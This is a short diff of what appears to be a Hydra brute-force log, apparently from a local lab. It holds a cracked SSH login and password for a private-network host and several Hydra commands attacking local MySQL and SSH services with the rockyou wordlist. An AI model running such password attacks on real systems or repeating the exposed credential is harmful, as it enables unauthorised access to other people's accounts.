@@ -2,3 +2,4 @@
 [22][ssh] host: 192.168.1.13   login: zero   password: Cmonster2006
 # Hydra v9.5 run at 2023-10-08 08:39:46 on localhost mysql (hydra -l root -P rockyou.txt -t 64 -vV -o output.log -I mysql://localhost)
 # Hydra v9.5 run at 2023-10-08 14:03:28 on localhost ssh (hydra -l zero -P rockyou.txt -t 64 -vV -o output.log -I ssh://localhost)
+# Hydra v9.5 run at 2023-10-09 14:58:25 on localhost ssh (hydra -l zero -P rockyou.txt -t 64 -vV -o output.log -I ssh://localhost)
